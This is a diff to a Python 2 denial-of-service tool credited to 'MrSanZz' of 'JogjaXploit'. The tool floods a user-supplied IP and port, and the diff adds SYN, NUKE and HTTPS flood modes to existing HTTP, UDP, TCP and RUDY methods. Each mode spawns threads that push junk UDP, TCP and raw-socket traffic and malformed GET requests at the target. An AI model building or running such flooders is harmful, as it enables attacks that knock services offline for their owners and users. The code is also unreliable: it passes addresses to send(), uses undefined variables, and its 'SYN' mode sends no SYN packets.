@@ -5,12 +5,14 @@ if os.name == "posix":
 elif os.name == "nt":
     os.system('cls')
 
-def logo():
-    print("\033[1;32m     ___  ___  ____  __  ____")
-    print("\033[1;91m    / _ \/ _ \/ __ \/ / / / /")
-    print("\033[1;34m   / // / // / /_/ / /_/_  _/")
-    print("\033[1;33m  /____/____/\____/____//_/  ")
-logo()                           
+print("\033[1;31;40m  _____  _____   ____   _____       _                             ______ ")
+print(" |  __ \|  __ \ / __ \ / ____|     | |                           |____  |")
+print(" | |  | | |  | | |  | | (___ ______| |     __ _ _   _  ___ _ __      / / ")
+print(" | |  | | |  | | |  | |\___ \______| |    / _` | | | |/ _ \ '__|    / /  ")
+print(" | |__| | |__| | |__| |____) |     | |___| (_| | |_| |  __/ |      / /   ")
+print(" |_____/|_____/ \____/|_____/      |______\__,_|\__, |\___|_|     /_/    ")
+print("                                                 __/ |                   ")
+print("                                                |___/                    ")
 print("\n")
 print("\033[1;34m_"*33)
 print("\033[1;32mExists Method:")
@@ -18,6 +20,9 @@ print("1.HTTP")
 print("2.UDP")
 print("3.TCP")
 print("4.RUDY")
+print("5.SYN")
+print("6.NUKE")
+print("7.HTTPS")
 print("\033[1;34m_"*33)
 print("\t\t\033[37mMade By MrSanZz")
 print("\tTeam : \033[1;91mJogjaXploit\033[37m")
@@ -41,7 +46,7 @@ while True:
             port = input("Port : ")
             thread = input("Thread : ")
             bytes = input("Bytes Per Sec : ")
-         
+
             def fluud():
                 try:
                     udp.sendto(byte, (ip,port))
@@ -123,6 +128,80 @@ while True:
             for i in range(thread):
                 thread = threading.Thread(target=rudy)
                 thread.start()    
+        elif prompt.lower() == "syn":
+            print("\033[1;32mSYN Flood")
+            ip = raw_input("IP Target : ")
+            port = input("Port : ")
+            thread = input("Thread : ")
+            bps = input("Bytes Per Sec : ")
+            
+            def syn():
+                for i in fakeit:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s2= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s3= socket.socket(socket.AF_INET, socket.SOCK_RAW)
+                        s.sendto(byte, (ip,port))
+                        for i in range(bps):
+                            s.sendto(byte, (ip,port))
+                        s2.send(("GET /HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
+                        s2.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
+                        s3.sendto(byte, (ip,port))
+                    except:
+                        print "\033[1;33m[ SYN ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
+            for i in range(thread):
+                thd = threading.Thread(target=syn)
+                thd.start()
+        elif prompt.lower() == "nuke":
+            print("\033[1;32mNuke Flood")
+            ip = raw_input("IP Target : ")
+            port = input("Port : ")
+            thread = input("Thread : ")
+            bps = input("Bytes Per Sec : ")
+            
+            def nuke():
+                for i in fakeit:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s2= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        for i in range(bps):
+                            s2.sendto(byte, (ip,port))
+                            s2.sendto(byte2, (ip,port))
+                            for e in range(bps):
+                                s2.sendto(byte, (ip,port))
+                        s.send(("GET /HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
+                        s.send(("GET /1.1/HTTP/1.2\r\n\r\n").encode("ascii"), (ip,port))
+                        s.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
+                    except:
+                        print "\033[1;33m[ NUKE ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
+            for i in range(thread):
+                thd = threading.Thread(target=nuke)
+                thd.start()
+        elif prompt.lower() == "https":
+            ht = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            print("\033[1;32mHTTPS Flood")
+            ip = raw_input("IP Target : ")
+            port = input("Port : ")
+            thread = input("Thread : ")
+            bps = input("Bytes Per Sec : ")
+            
+            def https():
+                x = int(0)
+                for i in fakeit:
+                    try:
+                        x += 1
+                        for i in range(bps):
+                            udp.sendto(byte, (ip,port))
+                            udp.sendto(byte2, (ip,port))
+                        ht.sendall(("GET /"+ip+" HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
+                        ht.sendall(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
+                        ht.send(byte)
+                        ht.send(byte2)
+                    except:
+                        print "\033[1;33m[ HTTPS ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s sent : %s"%(sent,ip,port)
+            for i in range(thread):
+                thd = threading.Thread(target=https)
+                thd.start()
         elif prompt.lower() == "exit":
             exit()       
         else:
